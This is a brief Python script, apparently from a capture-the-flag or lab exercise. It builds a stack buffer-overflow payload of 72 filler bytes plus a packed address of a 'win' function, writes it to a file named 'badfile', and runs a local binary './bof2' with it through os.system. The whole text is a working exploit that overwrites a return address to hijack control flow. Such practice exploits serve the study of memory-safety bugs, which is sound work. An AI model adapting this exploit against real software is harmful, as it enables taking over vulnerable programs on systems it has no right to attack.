import struct
import os

win = 0x804849b

atk_vector = "A"*72
atk_vector += struct.pack("I", win)

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()

os.system("./bof2 $(cat {})".format('badfile'))
